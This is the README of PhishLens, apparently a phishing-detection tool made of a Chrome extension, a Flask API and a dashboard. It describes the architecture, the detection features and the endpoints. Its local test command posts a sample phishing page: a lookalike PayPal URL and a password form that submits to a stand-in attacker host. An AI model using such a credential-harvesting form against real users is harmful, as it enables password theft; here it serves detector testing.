# PhishLens v0.2.0

**Real-time AI-powered browser phishing detection and threat intelligence platform with explainable warnings, interactive cybersecurity dashboard, and DOM security highlights.**

---

## ⚡ Quick Start (Windows)

1. **One-Click Launch**: Double-click `run_phishlens.bat`.
   - Auto-configures Python virtual environment (`.venv`).
   - Verifies required packages (`requirements.txt`).
   - Starts API server at `http://127.0.0.1:8000`.
   - Automatically opens `dashboard/index.html`.
2. **Load Chrome Extension**:
   - Open `chrome://extensions` in Chrome.
   - Enable **Developer mode** (top-right toggle).
   - Click **Load unpacked** and select the `extension/` directory.

---

## 🏛️ Architecture & Full-Stack System

```
                  ┌─────────────────────────────────────┐
                  │       Chrome Extension (V3)         │
                  │   • Real-time tab DOM analysis      │
                  │   • Severe threat blocking overlay  │
                  │   • Animated SVG circular dial      │
                  │   • Neon DOM element highlighting   │
                  └──────────────────┬──────────────────┘
                                     │ JSON {url, html}
                                     ▼
                  ┌─────────────────────────────────────┐
                  │           Flask API Server          │
                  │  Endpoints:                         │
                  │   • POST /check     • POST /simulate│
                  │   • GET  /stats     • GET  /events  │
                  │   • DEL  /events    • GET  /health  │
                  │                                     │
                  │ Feature Extraction (features.py)    │
                  │  - Typosquatting / Levenshtein      │
                  │  - Punycode & IDN Homographs        │
                  │  - Domain & Path Shannon Entropy    │
                  │  - Cross-domain & Insecure Forms    │
                  │  - Brand Logo & Text Mismatches     │
                  │                                     │
                  │ Hierarchical Risk Model (model.py)  │
                  │  - Domain, URL, Brand, DOM Scores   │
                  │  - Non-Linear Compound Multipliers  │
                  │                                     │
                  │ Explainability Engine (explain.py)  │
                  │  - Severity-tagged Anomaly Reasons  │
                  │  - Precision DOM CSS Selectors      │
                  └──────────────────┬──────────────────┘
                                     │
                                     ▼
                  ┌─────────────────────────────────────┐
                  │       SQLite Event Data Layer       │
                  │  `phishlens.db` (events table)      │
                  └──────────────────┬──────────────────┘
                                     │
                                     ▼
                  ┌─────────────────────────────────────┐
                  │     Cyberpunk Analytics Dashboard   │
                  │  `dashboard/index.html`             │
                  │   • Live KPI summary cards          │
                  │   • SVG Threat Severity Donut       │
                  │   • Top Impersonated Brands Bar     │
                  │   • Interactive Live URL Simulator  │
                  │   • Search, Filters & CSV/JSON Exp  │
                  │   • Event Inspection Drawer Modal   │
                  └─────────────────────────────────────┘
```

---

## 🚀 Key Features & Capabilities

### 1. Hierarchical Feature Extraction & Scoring Engine
- **Typosquatting & Edit Distance**: Calculates Levenshtein similarities against popular brands (PayPal, Microsoft, Apple, Google, Amazon, Netflix, Chase, Binance, Steam, Coinbase, etc.).
- **Homograph & IDN Attacks**: Identifies punycode (`xn--`) character obfuscation.
- **Obfuscation Detection**: Hex/octal encoded IPs, `@` tokens, multi-subdomain depth, path entropy.
- **DOM & Form Auditing**: Flags cross-domain form submission destinations, forms submitting over unencrypted HTTP, password inputs on non-HTTPS origins, hidden iframes, and deceptive brand logo usage.

### 2. Modern Cyberpunk Analytics Dashboard
- **Threat KPI Cards**: Real-time total scans, critical detections, suspicious anomalies, safe sites, and average threat risk.
- **Dynamic Visualizations**: Native SVG Donut chart for threat distribution and horizontal progress bar charts for top targeted brands.
- **Live Simulator Test Bench**: Test any URL/HTML payload directly with preset phishing attack templates without needing the browser extension loaded.
- **Event Intelligence**: Real-time event log stream with live search, severity filters (`Critical`, `Warning`, `Safe`), pagination, JSON/CSV exports, and detailed event inspection modals.

### 3. Chrome Extension Proactive Defense
- **Dynamic Action Badges**: Color-coded risk percentage badges (Green, Amber, Red).
- **Interactive Popup**: Circular animated SVG gauge, categorized threat breakdown bars (Domain, URL, Brand, DOM), and instant Element Highlighting.
- **Moderate Risk Banner (50-79%)**: Non-intrusive floating cyber alert bar at the top of suspicious web pages.
- **Critical Blocking Interstitial (≥80%)**: Full-screen cyber security overlay preventing credential entry with safety exit and optional bypass.

---

## 🛠️ API Reference

| Endpoint | Method | Description |
|---|---|---|
| `/health` | `GET` | Service status, version, and server timestamp |
| `/check` | `POST` | Scans `{ url, html }`, logs event, returns risk score & explainability |
| `/simulate` | `POST` | Interactive test endpoint returning full feature breakdown |
| `/stats` | `GET` | Aggregated analytics metrics, tier counts, and top brands |
| `/events` | `GET` | Paginated event list with filters (`level`, `brand`, `search`) |
| `/events/<id>` | `GET` / `DELETE` | Retrieve or delete a specific event by ID |
| `/events` | `DELETE` | Clears all stored detection events |

---

## 🧪 Testing Locally

To start the backend manually:
```powershell
python backend\app.py
```
To run tests and verify detection endpoints:
```powershell
curl -X POST http://127.0.0.1:8000/check -H "Content-Type: application/json" -d '{"url":"https://paypa1-security.com/login.html","html":"<form action=\"http://attacker.xyz/post\"><input type=\"password\"></form>"}'
```
